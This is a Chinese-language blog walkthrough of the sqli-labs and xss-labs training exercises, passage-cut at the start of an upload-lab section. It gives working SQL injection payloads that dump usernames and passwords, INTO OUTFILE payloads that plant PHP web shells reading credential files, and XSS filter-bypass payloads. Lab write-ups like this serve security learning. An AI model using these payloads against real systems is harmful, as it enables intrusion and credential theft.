src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224319439.png" alt="image-20200714224319439"></p><p>于是第一关完成</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-2/?id=2111111%20union%20select%20user(),group_concat(password),group_concat(username)%20from%20users%20order%20by%203</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126190149545.png" alt="image-20201126190149545"></p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>闭合<code>(&#39;</code>,然后用–+注释之后的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-3/?id=-111%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126193130954.png" alt="image-20201126193130954"></p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>闭合<code>(&quot;</code>,然后用–+注释之后的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-4/?id=-9%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126201348544.png" alt="image-20201126201348544"></p><h3 id="Less-5-布尔注入"><a href="#Less-5-布尔注入" class="headerlink" title="Less-5 布尔注入"></a>Less-5 布尔注入</h3><p>首先要还是要确定注入类型，如字符型、数字型，然后构造条件。</p><p>这里用left函数取单个字符来确定整个字符串的取值，由二分可知database()的第一个字符为’s’。</p><p>先通过简单的测试得知这里有注入点，而且因为只有两种回显状态，所以应该是bool注入。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094329018.png" alt="image-20201128094329018"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094347246.png" alt="image-20201128094347246"></p><p>以上的<code>1=2</code>和<code>1=1</code>的语句是被执行了的，下面将其替换为其他语句猜解关键信息。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204229902.png" alt="image-20201126204229902"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204246514.png" alt="image-20201126204246514"></p><p>更详细一点儿，还可以通过length函数先确定一下database()的长度。</p><p>除了上述的带boolean回显的二分盲注，还可以通过使用sleep()的时间盲注，或者基于笛卡尔积的时间盲注。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094740436.png" alt="image-20201128094740436"></p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>类似于Less-5,只是换成了双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-6/?id=-1%22%20or%20left(database(),1)=%27s%27--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126205514505.png" alt="image-20201126205514505"></p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>记得打开<code>secure-file-priv=&quot;&quot;</code></p><p>由提示,需要用到外部文件,先利用less-1搞清楚工作目录</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126220832111.png" alt="image-20201126220832111"></p><p>然后利用MySQL文件操作在目录下面写一个php一句话木马<br>目录指定为<code>D:\phpStudy\sqli-labs\horse1.php</code><br>为了获取Less-7的源码,木马内容先写成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;D:\\phpStudy\\WWW\\sqli-labs\Less-7\index.php&quot;</span>; <span class="comment">#也可能是index.html,这里是试出来的,且注意转义</span></span><br><span class="line"><span class="variable">$h</span>=fopen(<span class="variable">$f</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=fread(<span class="variable">$h</span>,filesize(<span class="variable">$f</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">fclose(<span class="variable">$h</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- payload --&gt;</span></span><br><span class="line">http://192.168.218.133/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\index.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);%20?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse1.php%22%20--+</span><br></pre></td></tr></table></figure><p>虽然页面上还是返回Error,但是实际上是写入成功的,接下来访问horse1.php<br>这里相当于用一个php 输出了另外一个html+php文件的内容,所以浏览器会自动解析,文件的具体内容在开发者工具里面查看</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222034823.png" alt="image-20201126222034823"></p><p>可以看到Less-7 index.php的源代码,包括Sql语句的拼接方式,这里解释了为什么要闭合双括号.<br>同时,可以看到php包含了sql-connect.php来连接数据库,于是再用类似的方法查看sql-connect.php的源代码</p><p>向目录下写入木马horse2.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f=&quot;D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php&quot;;</span><br><span class="line">$h=fopen($f,&quot;r&quot;);</span><br><span class="line">$c=fread($h,filesize($f));</span><br><span class="line">echo $c;</span><br><span class="line">fclose($h);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- payload --&gt;</span></span><br><span class="line">http://192.168.218.133/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse2.php%22%20--+</span><br></pre></td></tr></table></figure><p>访问horse2.php</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222837646.png" alt="image-20201126222837646"></p><p>发现sql-connect.php又包含了一个db-creds.inc配置文件来连接数据库,于是故技重施,去查看这个文件的源代码</p><p>向目录下写入木马horse3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\db-creds.inc&quot;</span>;</span><br><span class="line"><span class="variable">$h</span>=fopen(<span class="variable">$f</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=fread(<span class="variable">$h</span>,filesize(<span class="variable">$f</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">fclose(<span class="variable">$h</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! payload --&gt;</span><br><span class="line">http://192.168.218.139/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse2.php%22%20--+</span><br></pre></td></tr></table></figure><p>访问horse3.php，可以看到数据库的用户名和密码。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127103843514.png" alt="image-20201127103843514"></p><p>进一步的，我们可以通过向目录下写入木马horse4.php去查询数据库中的所有信息，因为已经获取的用户名和密码，所以这个过程是容易实现的。更容易的实现方法是直接仿照index.php的代码，包含文件<code>..\sql-connections\sql-connect.php</code>即可获得数据库访问权限，然后写代码查询即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;..\\sql-connections\\sql-connect.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select group_concat(username),group_concat(password) from users&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$row</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! payload--&gt;</span><br><span class="line">http://192.168.218.139/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20include(%22..\\sql-connections\\sql-connect.php%22);%20$sql=%22select%20group_concat(username),group_concat(password)%20from%20users%22;%20$res%20=%20mysql_query($sql);%20$row%20=%20mysql_fetch_array($res);%20echo%20json_encode($row);%20?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\horse4.php%22%20--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110111890.png" alt="image-20201127110111890"></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>闭合单引号，然后是bool盲注</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110313357.png" alt="image-20201127110313357"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110922998.png" alt="image-20201127110922998"></p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>基于时间的bool盲注</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.139/sqli-labs/Less-9/?id=-1%27%20union%20select%201,(if(%20database()=%27security%27,%20sleep(2),2)),3--+</span><br></pre></td></tr></table></figure><p>在if的条件语句里面写一些二分语句即可基于时间猜出数据库内容。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>类似于Less-9，只是换成了双引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.139/sqli-labs/Less-9/?id=-1%27%20union%20select%201,(if(%20database()=%27security%27,%20sleep(2),2)),3--+</span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>基于报错的注入方法</p><p>POST payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)))--+;&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163052801.png" alt="image-20201127163052801"></p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>类似于Less-11，只是需要闭合<code>(&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&quot;) and (extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)))--+&amp;passwd=dasdfasd&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163743773.png" alt="image-20201127163743773"></p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>为什么又是报错注入，只是换了闭合符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! POST payload --&gt;</span><br><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e))-- + &amp;passwd=admian&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174352569.png" alt="image-20201127174352569"></p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>同上，闭合双引号</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174606873.png" alt="image-20201127174606873"></p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>二分盲注，闭合单引号，下图说明admin用户的密码的首字母为’a’。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127175332286.png" alt="image-20201127175332286"></p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>闭合<code>(&quot;</code>的时间盲注</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127181919126.png" alt="image-20201127181919126"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>有意思的一个题，因为这里用到了两个参数。</p><p>通过审计源代码，可以看到这里的查询语句稍微有点儿安全意识，不仅对uname进行了严格的过滤，还考虑了先通过uname检查数据库中是否包含了对应用户的数据，然后再去修改用户。<br>但是为什么不对password也过滤一次呢？</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127202028435.png" alt="image-20201127202028435"></p><p>由提示，使用报错注入。<br>但是这里有一个问题，我们如何知道数据库中有哪些用户名呢？这关系到我们是否能够通过第一次SQL查询从而进入内部的if语句中。当然，可以考虑常见的用户名如admin、root、administration等等，但是如果恰好没有这些用户名呢？</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127200552580.png" alt="image-20201127200552580"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>审计源码，可以看到php还捕获了IP和uagent两个参数，其中uagent可以被控制且未被过滤。<br>根据关口名称提示，利用uagent完成报错注入</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204937987.png" alt="image-20201127204937987"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204824111.png" alt="image-20201127204824111"></p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>同上，只是注入点换成了referer</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127205230525.png" alt="image-20201127205230525"></p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>审计源码，注意判断条件。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213608048.png" alt="image-20201127213608048"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213523251.png" alt="image-20201127213523251"></p><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>sqlmap基本上是一梭子的事儿，因为sqlmap足够强大，一般的注入点都能打下来，要是sqlmap都没办法，那么人力也很难了。<br>当然，这里可能会有参数处理(base64)使得sqlmap不能直接使用，那么就需要写代码配合sqlmap了。</p><p>抬手就开始</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233829160.png" alt="image-20200714233829160"></p><p>然后就出了</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233955698.png" alt="image-20200714233955698"></p><p>接下来就只需要按图索骥，从数据库名查表名、列名和字段值了。注意-T -D设定table和database来限定范围。</p><p>一下介绍一些扩展用法</p><blockquote><p> sqlmap -r xxx.txt -p 自动测试抓到的包内的一个post参数</p><p> sqlmap -u 自动测试一个存在注入的url（一般后台比较好用，可以-p指定包中的某个post参数）</p><p> sqlmap -u -data 测试url中get的注入</p><p> sqlmap -u -data –dbs –level2 在level2中，会引入自动化的cookie注入</p><p> 设置temper参数来选定测试的级别</p></blockquote><h2 id="XSS-Lab"><a href="#XSS-Lab" class="headerlink" title="XSS-Lab"></a>XSS-Lab</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>首先审查元素，明确输入的payload在页面中的位置。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png" alt="image-20201128111226621"></p><p>显然，这里需要闭合<code>&lt;h2&gt;</code>标签，然后跟上js代码。</p><p>因为是第一关，没有特别的过滤，直接闭合就好了。</p><p><code>http://192.168.68.219/xss/level1.php?name=test&lt;/h2&gt;&lt;script&gt;alert(&#39;xxs&#39;);&lt;/script&gt;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png" alt="image-20201128111106471"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>html实体编码</p><p>这里要往表单input标签里面注入<br><code>http://192.168.68.219/xss/level2.php?keyword=aa%22%3E%3Cscript%3Ealert(1);%3C/script%3E</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png" alt="image-20200715144909149"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><code>&lt;&gt;</code>被实体编码拦截，但是加<code>&#39;</code>或者<code>&quot;</code>会使得浏览器自动补全。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png" alt="image-20201128120223330"></p><p>这里关注input标签，使用onfocus=alert(1) autofocus移动光标到元素上(或者点击)就可以触发弹窗。<br><code>http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png" alt="image-20200715151535637"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png" alt="image-20201128111939700"></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这里会在<code>=</code>后面添加<code>&quot;</code>于是onfocus=alert(1)不大行了（其实还是可以触发弹窗，不过不能触发window.alert()<br>既然会自动添加<code>&quot;</code>，那么刚好用”javascript:xxxx”的方式来绕过。（好吧这个也不能触发跳转<br><code>http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert%281%29</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png" alt="image-20200715152933866"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>过滤了script-&gt;s_cript    onload-&gt;o_nload<br>不知道为什么javascript:alert(1)没反应，明明解析出来都没问题。</p><p><code>http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png" alt="image-20200715160658462"></p><p><code>http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert%281%29</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png" alt="image-20200715160638311"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>href-&gt;hr_ef<br>src-&gt;sr_c</p><p>懂了，原来考的是大小写绕过，那么前面几个题也可以按照这种方法来过。</p><p><code>http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E</code></p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>存在关键词过滤，这里可以使用双写关键字绕过过滤，并不能使用大小写绕过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png" alt="image-20201128113421841"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png" alt="image-20201128113531000"></p><p><code>http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png" alt="image-20201128112539027"></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>非常神奇地在这儿卡了半天，因为一些编码的问题。</p><p>审计PHP的源代码，发现过滤了script等关键字，当然可以通过实体编码绕过，比如hex或者unicode，但是要命的是hex有可能在浏览器中被自动解码再发送，而unicode是以&amp;#开头。在url中，&amp;用来分割参数，#之后的部分不向后端发送，只在本地被使用(比如锚点定位)。</p><p>如 <code>keyword=javascrip&amp;#116;:alert(1)</code>,在后端，keyword只接受到<code>javascrip</code>，非常难过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114131808.png" alt="image-20201128114131808"></p><p>又如<code>keyword=%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29</code>，只使用一次urlhex编码，然后被浏览器自动解码。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114214613.png" alt="image-20201128114214613"></p><p><strong>solution</strong></p><p>解决办法是使用两次编码，先unicode 后 urlhex。</p><p><code>javascript:alert(1)</code></p><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p><p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p><p>payload:<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114408003.png" alt="image-20201128114408003"></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>在level8的基础之上，会检查网址格式是否包含http://，所以直接alert(‘http://‘)就好，其余和level8一样，只需要编码javascript就好。</p><p>level9.php?<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert(%27http://%27)</code></p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>检查到有三个隐藏的参数，那么首先就是要取消隐藏属性，然后构造xss触发弹窗就好，貌似没有之前的考点。</p><p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onfocus=javascript:alert(1)%20autofocus%20type=&quot;on</code></p><p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onmouseover=javascript:alert(1)%20autofocus%20type=&quot;on</code></p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>这一关比较有意思，虽然t_sort可以被操纵，但是被编码了，没有利用的办法。注入点在refer里，所以只是把level10的payload写在refer里面就好。<br>Firefox好像可以拦截请求修改之后再放出去，但是没有取了解，这里用的是burp。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204721930.png" alt="image-20200715204721930"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204737776.png" alt="image-20200715204737776"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204810094.png" alt="image-20200715204810094"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>类似的，只是注入的是useragent</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210259484.png" alt="image-20200715210259484"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210328418.png" alt="image-20200715210328418"></p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>仍然是类似的，注入的是cookie</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png" alt="image-20200715210549269"></p><h3 id="level14–"><a href="#level14–" class="headerlink" title="level14–"></a>level14–</h3><p>不会，看了WP也不会的那种。</p><p><code>https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</code></p><h3 id="level15–"><a href="#level15–" class="headerlink" title="level15–"></a>level15–</h3><p>angular倒是很有意思，但是不会。</p><p><code>https://www.runoob.com/angularjs/angularjs-intro.html</code></p><p>加载angular.js要科学上网，上网回来请求多了这一坨回来不知道怎么回事儿。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png" alt="image-20200716114658159"></p><p>然后console里面就这样了，看上去level1.php是请求了，但是没有被加载到页面里。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716115010742"></p><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>一开始仿照以前的两次编码，写了这个payload，但是关键字不能被解析，反而一直被当成文本，想来可能是两次编码的问题。</p><p><code>level16.php?keywordcode></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716091758748"></p><p>后面还是上网了，看到可以用<code>%0d</code>(tab)和<code>%0a</code>(换行)来截断。</p><p><code>level16.php?keyword=1111%3Cimg%0asrc=1%0aonerror=%22javascript:alert(1)%22%3E%3Ccenter%3E</code></p><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>审查元素，可以发现GET参数实则是Flash脚本的参数。</p><p>通过查询flash xss相关文章，可以了解到jsFunction是个关键，构造payload使得jsFunction这个关键字被解析，从而跳出了src属性，然后使用常用的onmouseover属性方法加载xss payload。</p><p>jsFunction被解析为属性名。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115239376.png" alt="image-20201128115239376"></p><p>然后使用onmouseover或者其他方法执行alert()语句，如果过滤空格，根据level16,可以用%0a绕过。</p><p><code>?arg01=1111&quot;&amp;arg02=eeeeee%20jsFunction%0aonmouseover=javascript:alert(1)</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115638195.png" alt="image-20201128115638195"></p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>同样的套路。</p><p><code>?arg01=a&amp;arg02=b%20jsFunction%20onmouseover=javascript:alert(1)</code></p><h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p><a href="https://www.freesion.com/article/6253464226/">https://www.freesion.com/article/6253464226/</a></p><p>抄袭payload: <code>arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(/xss/)%22%20onerror=%22javascript:alert(1)%22%3Exss%3C/a%3E</code></p><h3 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h3><p>竟然还需要逆向swf，那就只好抄了。</p><p><a href="https://blog.csdn.net/u014029795/article/details/103217680">https://blog.csdn.net/u014029795/article/details/103217680</a></p><h2 id="Upload-Lab"><a href="#Upload-Lab" class="headerlink" title="Upload-Lab"></a>Upload-Lab</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>图片马的检测与绕过</p><p><a href="https://www.jianshu.com/p/744001fd0738">https://www.jianshu.com/p/744001fd0738</a></p><p><a href="http://www.nowamagic.net/librarys/veda/detail/1618">http://www.nowamagic.net/librarys/veda/detail/1618</a></p><p>文件上传绕过总览</p><p><a 